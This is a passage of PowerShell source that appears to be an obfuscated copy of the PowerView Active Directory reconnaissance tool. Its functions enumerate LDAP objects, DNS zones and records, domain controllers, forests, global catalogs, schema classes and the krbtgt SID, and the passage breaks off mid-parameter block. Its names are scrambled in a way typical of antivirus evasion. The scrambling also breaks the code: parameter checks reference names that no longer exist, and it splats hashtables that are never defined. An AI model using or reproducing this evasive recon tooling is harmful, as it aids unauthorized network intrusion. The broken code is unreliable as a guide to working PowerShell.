    $ycQOyvWh99.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $hjTjfzZi99[$_] = $ycQOyvWh99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $hjTjfzZi99[$_] = $ycQOyvWh99[$_][0] -as $jYfvsjeJ99
            }
            elseif ($_ -eq 'samaccounttype') {
                $hjTjfzZi99[$_] = $ycQOyvWh99[$_][0] -as $pOUqwZDm99
            }
            elseif ($_ -eq 'objectguid') {
                $hjTjfzZi99[$_] = (New-Object Guid (,$ycQOyvWh99[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $hjTjfzZi99[$_] = $ycQOyvWh99[$_][0] -as $XhWoAzaE99
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $hAvsWEjv99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $ycQOyvWh99[$_][0], 0
                if ($hAvsWEjv99.Owner) {
                    $hjTjfzZi99['Owner'] = $hAvsWEjv99.Owner
                }
                if ($hAvsWEjv99.Group) {
                    $hjTjfzZi99['Group'] = $hAvsWEjv99.Group
                }
                if ($hAvsWEjv99.DiscretionaryAcl) {
                    $hjTjfzZi99['DiscretionaryAcl'] = $hAvsWEjv99.DiscretionaryAcl
                }
                if ($hAvsWEjv99.SystemAcl) {
                    $hjTjfzZi99['SystemAcl'] = $hAvsWEjv99.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($ycQOyvWh99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $hjTjfzZi99[$_] = "NEVER"
                }
                else {
                    $hjTjfzZi99[$_] = [datetime]::fromfiletime($ycQOyvWh99[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($ycQOyvWh99[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $ycQOyvWh99[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $hjTjfzZi99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $hjTjfzZi99[$_] = ([datetime]::FromFileTime(($ycQOyvWh99[$_][0])))
                }
            }
            elseif ($ycQOyvWh99[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $ycQOyvWh99[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $hjTjfzZi99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[foregather] error: $_"
                    $hjTjfzZi99[$_] = $Prop[$_]
                }
            }
            elseif ($ycQOyvWh99[$_].count -eq 1) {
                $hjTjfzZi99[$_] = $ycQOyvWh99[$_][0]
            }
            else {
                $hjTjfzZi99[$_] = $ycQOyvWh99[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $hjTjfzZi99
    }
    catch {
        Write-Warning "[foregather] Error parsing LDAP properties : $_"
    }
}
function maroons {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ycQOyvWh99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $AFJxOPyQ99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99 = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $azVlDiTB99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $TDntIjFc99 = $jnYnRnFJ99
            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                $CQMlcaaA99 = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $CQMlcaaA99) {
                    $XKGvwlsR99 = "$($ENV:LOGONSERVER -replace '\\','').$CQMlcaaA99"
                }
            }
        }
        elseif ($PSBoundParameters['Credential']) {
            $fmkqgmjZ99 = indicate -fjBNCklg99 $fjBNCklg99
            $XKGvwlsR99 = ($fmkqgmjZ99.PdcRoleOwner).Name
            $TDntIjFc99 = $fmkqgmjZ99.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            $TDntIjFc99 = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TDntIjFc99) {
                $XKGvwlsR99 = "$($ENV:LOGONSERVER -replace '\\','').$TDntIjFc99"
            }
        }
        else {
            write-verbose "get-domain"
            $fmkqgmjZ99 = indicate
            $XKGvwlsR99 = ($fmkqgmjZ99.PdcRoleOwner).Name
            $TDntIjFc99 = $fmkqgmjZ99.Name
        }
        if ($PSBoundParameters['Server']) {
            $XKGvwlsR99 = $qgdPgdMB99
        }
        $SbSOHGRa99 = 'LDAP://'
        if ($XKGvwlsR99 -and ($XKGvwlsR99.Trim() -ne '')) {
            $SbSOHGRa99 += $XKGvwlsR99
            if ($TDntIjFc99) {
                $SbSOHGRa99 += '/'
            }
        }
        if ($PSBoundParameters['SearchBasePrefix']) {
            $SbSOHGRa99 += $AFJxOPyQ99 + ','
        }
        if ($PSBoundParameters['SearchBase']) {
            if ($WdOnSHnL99 -Match '^GC://') {
                $DN = $WdOnSHnL99.ToUpper().Trim('/')
                $SbSOHGRa99 = ''
            }
            else {
                if ($WdOnSHnL99 -match '^LDAP://') {
                    if ($WdOnSHnL99 -match "LDAP://.+/.+") {
                        $SbSOHGRa99 = ''
                        $DN = $WdOnSHnL99
                    }
                    else {
                        $DN = $WdOnSHnL99.SubString(7)
                    }
                }
                else {
                    $DN = $WdOnSHnL99
                }
            }
        }
        else {
            if ($TDntIjFc99 -and ($TDntIjFc99.Trim() -ne '')) {
                $DN = "DC=$($TDntIjFc99.Replace('.', ',DC='))"
            }
        }
        $SbSOHGRa99 += $DN
        Write-Verbose "[maroons] search base: $SbSOHGRa99"
        if ($fjBNCklg99 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[maroons] Using alternate credentials for LDAP connection"
            $fmkqgmjZ99 = New-Object DirectoryServices.DirectoryEntry($SbSOHGRa99, $fjBNCklg99.UserName, $fjBNCklg99.GetNetworkCredential().Password)
            $NWZRAqED99 = New-Object System.DirectoryServices.DirectorySearcher($fmkqgmjZ99)
        }
        else {
            $NWZRAqED99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SbSOHGRa99)
        }
        $NWZRAqED99.PageSize = $CgYkCByk99
        $NWZRAqED99.SearchScope = $TRVzBsDk99
        $NWZRAqED99.CacheResults = $False
        $NWZRAqED99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters['ServerTimeLimit']) {
            $NWZRAqED99.ServerTimeLimit = $elDiVqTz99
        }
        if ($PSBoundParameters['Tombstone']) {
            $NWZRAqED99.Tombstone = $True
        }
        if ($PSBoundParameters['LDAPFilter']) {
            $NWZRAqED99.filter = $SeHRgLsL99
        }
        if ($PSBoundParameters['SecurityMasks']) {
            $NWZRAqED99.SecurityMasks = Switch ($azVlDiTB99) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters['Properties']) {
            $nyKTLUsD99 = $ycQOyvWh99| ForEach-Object { $_.Split(',') }
            $Null = $NWZRAqED99.PropertiesToLoad.AddRange(($nyKTLUsD99))
        }
        $NWZRAqED99
    }
}
function microwave {
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $MefxQrSW99
    )
    BEGIN {
        function postpone {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )
            [Int]$hTHJXGFW99 = $Raw[0]
            [Int]$EbEAPrEL99 = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''
            while ($EbEAPrEL99-- -gt 0)
            {
                [Int]$PFDEAEJJ99 = $Raw[$Index++]
                while ($PFDEAEJJ99-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }
    PROCESS {
        $fYTrkkiZ99 = [BitConverter]::ToUInt16($MefxQrSW99, 2)
        $nmlGPxKl99 = [BitConverter]::ToUInt32($MefxQrSW99, 8)
        $sDGKUXUq99 = $MefxQrSW99[12..15]
        $Null = [array]::Reverse($sDGKUXUq99)
        $TTL = [BitConverter]::ToUInt32($sDGKUXUq99, 0)
        $Age = [BitConverter]::ToUInt32($MefxQrSW99, 20)
        if ($Age -ne 0) {
            $KHohOfxc99 = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        else {
            $KHohOfxc99 = '[static]'
        }
        $iNAdKlSk99 = New-Object PSObject
        if ($fYTrkkiZ99 -eq 1) {
            $IP = "{0}.{1}.{2}.{3}" -f $MefxQrSW99[24], $MefxQrSW99[25], $MefxQrSW99[26], $MefxQrSW99[27]
            $Data = $IP
            $iNAdKlSk99 | Add-Member Noteproperty 'RecordType' 'A'
        }
        elseif ($fYTrkkiZ99 -eq 2) {
            $gljrSagr99 = postpone $MefxQrSW99[24..$MefxQrSW99.length]
            $Data = $gljrSagr99
            $iNAdKlSk99 | Add-Member Noteproperty 'RecordType' 'NS'
        }
        elseif ($fYTrkkiZ99 -eq 5) {
            $Alias = postpone $MefxQrSW99[24..$MefxQrSW99.length]
            $Data = $Alias
            $iNAdKlSk99 | Add-Member Noteproperty 'RecordType' 'CNAME'
        }
        elseif ($fYTrkkiZ99 -eq 6) {
            $Data = $([System.Convert]::ToBase64String($MefxQrSW99[24..$MefxQrSW99.length]))
            $iNAdKlSk99 | Add-Member Noteproperty 'RecordType' 'SOA'
        }
        elseif ($fYTrkkiZ99 -eq 12) {
            $Ptr = postpone $MefxQrSW99[24..$MefxQrSW99.length]
            $Data = $Ptr
            $iNAdKlSk99 | Add-Member Noteproperty 'RecordType' 'PTR'
        }
        elseif ($fYTrkkiZ99 -eq 13) {
            $Data = $([System.Convert]::ToBase64String($MefxQrSW99[24..$MefxQrSW99.length]))
            $iNAdKlSk99 | Add-Member Noteproperty 'RecordType' 'HINFO'
        }
        elseif ($fYTrkkiZ99 -eq 15) {
            $Data = $([System.Convert]::ToBase64String($MefxQrSW99[24..$MefxQrSW99.length]))
            $iNAdKlSk99 | Add-Member Noteproperty 'RecordType' 'MX'
        }
        elseif ($fYTrkkiZ99 -eq 16) {
            [string]$TXT  = ''
            [int]$PFDEAEJJ99 = $MefxQrSW99[24]
            $Index = 25
            while ($PFDEAEJJ99-- -gt 0) {
                $TXT += [char]$MefxQrSW99[$index++]
            }
            $Data = $TXT
            $iNAdKlSk99 | Add-Member Noteproperty 'RecordType' 'TXT'
        }
        elseif ($fYTrkkiZ99 -eq 28) {
            $Data = $([System.Convert]::ToBase64String($MefxQrSW99[24..$MefxQrSW99.length]))
            $iNAdKlSk99 | Add-Member Noteproperty 'RecordType' 'AAAA'
        }
        elseif ($fYTrkkiZ99 -eq 33) {
            $Data = $([System.Convert]::ToBase64String($MefxQrSW99[24..$MefxQrSW99.length]))
            $iNAdKlSk99 | Add-Member Noteproperty 'RecordType' 'SRV'
        }
        else {
            $Data = $([System.Convert]::ToBase64String($MefxQrSW99[24..$MefxQrSW99.length]))
            $iNAdKlSk99 | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
        }
        $iNAdKlSk99 | Add-Member Noteproperty 'UpdatedAtSerial' $nmlGPxKl99
        $iNAdKlSk99 | Add-Member Noteproperty 'TTL' $TTL
        $iNAdKlSk99 | Add-Member Noteproperty 'Age' $Age
        $iNAdKlSk99 | Add-Member Noteproperty 'TimeStamp' $KHohOfxc99
        $iNAdKlSk99 | Add-Member Noteproperty 'Data' $Data
        $iNAdKlSk99
    }
}
function rewards {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ycQOyvWh99,
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Alias('ReturnOne')]
        [Switch]
        $cIwTZAKh99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $XVFWmInN99 = @{
            'LDAPFilter' = '(objectClass=dnsZone)'
        }
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['Properties']) { $XVFWmInN99['Properties'] = $ycQOyvWh99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        $TAclzQkb99 = maroons @SearcherArguments
        if ($TAclzQkb99) {
            if ($PSBoundParameters['FindOne']) { $CmGXBhUd99 = $TAclzQkb99.FindOne()  }
            else { $CmGXBhUd99 = $TAclzQkb99.FindAll() }
            $CmGXBhUd99 | Where-Object {$_} | ForEach-Object {
                $Out = foregather -ycQOyvWh99 $_.Properties
                $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                $Out
            }
            if ($CmGXBhUd99) {
                try { $CmGXBhUd99.dispose() }
                catch {
                    Write-Verbose "[venous] Error disposing of the Results object: $_"
                }
            }
            $TAclzQkb99.dispose()
        }
        $XVFWmInN99['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
        $ppgQSlgv99 = maroons @SearcherArguments
        if ($ppgQSlgv99) {
            try {
                if ($PSBoundParameters['FindOne']) { $CmGXBhUd99 = $ppgQSlgv99.FindOne() }
                else { $CmGXBhUd99 = $ppgQSlgv99.FindAll() }
                $CmGXBhUd99 | Where-Object {$_} | ForEach-Object {
                    $Out = foregather -ycQOyvWh99 $_.Properties
                    $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                    $Out
                }
                if ($CmGXBhUd99) {
                    try { $CmGXBhUd99.dispose() }
                    catch {
                        Write-Verbose "[rewards] Error disposing of the Results object: $_"
                    }
                }
            }
            catch {
                Write-Verbose "[rewards] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
            }
            $ppgQSlgv99.dispose()
        }
    }
}
function lionizing {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $MpZUxCfb99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ycQOyvWh99 = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Alias('ReturnOne')]
        [Switch]
        $cIwTZAKh99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $XVFWmInN99 = @{
            'LDAPFilter' = '(objectClass=dnsNode)'
            'SearchBasePrefix' = "DC=$($MpZUxCfb99),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['Properties']) { $XVFWmInN99['Properties'] = $ycQOyvWh99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        $XppwtJMm99 = maroons @SearcherArguments
        if ($XppwtJMm99) {
            if ($PSBoundParameters['FindOne']) { $CmGXBhUd99 = $XppwtJMm99.FindOne() }
            else { $CmGXBhUd99 = $XppwtJMm99.FindAll() }
            $CmGXBhUd99 | Where-Object {$_} | ForEach-Object {
                try {
                    $Out = foregather -ycQOyvWh99 $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $Out | Add-Member NoteProperty 'ZoneName' $MpZUxCfb99
                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        $YurhHXRT99 = microwave -MefxQrSW99 $Out.dnsrecord[0]
                    }
                    else {
                        $YurhHXRT99 = microwave -MefxQrSW99 $Out.dnsrecord
                    }
                    if ($YurhHXRT99) {
                        $YurhHXRT99.PSObject.Properties | ForEach-Object {
                            $Out | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                    $Out
                }
                catch {
                    Write-Warning "[lionizing] Error: $_"
                    $Out
                }
            }
            if ($CmGXBhUd99) {
                try { $CmGXBhUd99.dispose() }
                catch {
                    Write-Verbose "[lionizing] Error disposing of the Results object: $_"
                }
            }
            $XppwtJMm99.dispose()
        }
    }
}
function indicate {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose '[indicate] Using alternate credentials for indicate'
            if ($PSBoundParameters['Domain']) {
                $TDntIjFc99 = $jnYnRnFJ99
            }
            else {
                $TDntIjFc99 = $fjBNCklg99.GetNetworkCredential().Domain
                Write-Verbose "[indicate] Extracted domain '$TDntIjFc99' from -fjBNCklg99"
            }
            $JIdSrWRx99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TDntIjFc99, $fjBNCklg99.UserName, $fjBNCklg99.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($JIdSrWRx99)
            }
            catch {
                Write-Verbose "[indicate] The specified domain '$TDntIjFc99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $JIdSrWRx99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $jnYnRnFJ99)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($JIdSrWRx99)
            }
            catch {
                Write-Verbose "[indicate] The specified domain '$jnYnRnFJ99' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[indicate] Error retrieving the current domain: $_"
            }
        }
    }
}
function basso {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [Switch]
        $LDAP,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $kxIjEmdJ99 = @{}
        if ($PSBoundParameters['Domain']) { $kxIjEmdJ99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Credential']) { $kxIjEmdJ99['Credential'] = $fjBNCklg99 }
        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
            if ($PSBoundParameters['Server']) { $kxIjEmdJ99['Server'] = $qgdPgdMB99 }
            $kxIjEmdJ99['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
            cowing @Arguments
        }
        else {
            $INzuCStC99 = indicate @Arguments
            if ($INzuCStC99) {
                $INzuCStC99.DomainControllers
            }
        }
    }
}
function nullified {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $NeieztNm99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose "[nullified] Using alternate credentials for nullified"
            if ($PSBoundParameters['Forest']) {
                $ywkQcSte99 = $NeieztNm99
            }
            else {
                $ywkQcSte99 = $fjBNCklg99.GetNetworkCredential().Domain
                Write-Verbose "[nullified] Extracted domain '$NeieztNm99' from -fjBNCklg99"
            }
            $oAtjHzVV99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $ywkQcSte99, $fjBNCklg99.UserName, $fjBNCklg99.GetNetworkCredential().Password)
            try {
                $wYqscyEE99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($oAtjHzVV99)
            }
            catch {
                Write-Verbose "[nullified] The specified forest '$ywkQcSte99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                $Null
            }
        }
        elseif ($PSBoundParameters['Forest']) {
            $oAtjHzVV99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $NeieztNm99)
            try {
                $wYqscyEE99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($oAtjHzVV99)
            }
            catch {
                Write-Verbose "[nullified] The specified forest '$NeieztNm99' does not exist, could not be contacted, or there isn't an existing trust: $_"
                return $Null
            }
        }
        else {
            $wYqscyEE99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }
        if ($wYqscyEE99) {
            if ($PSBoundParameters['Credential']) {
                $FsGEaQlC99 = (suit -feaYcbZI99 "krbtgt" -jnYnRnFJ99 $wYqscyEE99.RootDomain.Name -fjBNCklg99 $fjBNCklg99).objectsid
            }
            else {
                $FsGEaQlC99 = (suit -feaYcbZI99 "krbtgt" -jnYnRnFJ99 $wYqscyEE99.RootDomain.Name).objectsid
            }
            $Parts = $FsGEaQlC99 -Split '-'
            $FsGEaQlC99 = $Parts[0..$($Parts.length-2)] -join '-'
            $wYqscyEE99 | Add-Member NoteProperty 'RootDomainSid' $FsGEaQlC99
            $wYqscyEE99
        }
    }
}
function flukiest {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $NeieztNm99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $kxIjEmdJ99 = @{}
        if ($PSBoundParameters['Forest']) { $kxIjEmdJ99['Forest'] = $NeieztNm99 }
        if ($PSBoundParameters['Credential']) { $kxIjEmdJ99['Credential'] = $fjBNCklg99 }
        $wYqscyEE99 = nullified @Arguments
        if ($wYqscyEE99) {
            $wYqscyEE99.Domains
        }
    }
}
function afterthoughts {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $NeieztNm99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $kxIjEmdJ99 = @{}
        if ($PSBoundParameters['Forest']) { $kxIjEmdJ99['Forest'] = $NeieztNm99 }
        if ($PSBoundParameters['Credential']) { $kxIjEmdJ99['Credential'] = $fjBNCklg99 }
        $wYqscyEE99 = nullified @Arguments
        if ($wYqscyEE99) {
            $wYqscyEE99.FindAllGlobalCatalogs()
        }
    }
}
function rebating {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $zSHOhJNE99,
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $NeieztNm99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $kxIjEmdJ99 = @{}
        if ($PSBoundParameters['Forest']) { $kxIjEmdJ99['Forest'] = $NeieztNm99 }
        if ($PSBoundParameters['Credential']) { $kxIjEmdJ99['Credential'] = $fjBNCklg99 }
        $wYqscyEE99 = nullified @Arguments
        if ($wYqscyEE99) {
            if ($PSBoundParameters['ClassName']) {
                ForEach ($CmdOiCjR99 in $zSHOhJNE99) {
                    $wYqscyEE99.Schema.FindClass($CmdOiCjR99)
                }
            }
            else {
                $wYqscyEE99.Schema.FindAllClasses()
            }
        }
    }
}
function lynched {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $zSHOhJNE99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $bLaohisl99,
        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $bbVuSzqh99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
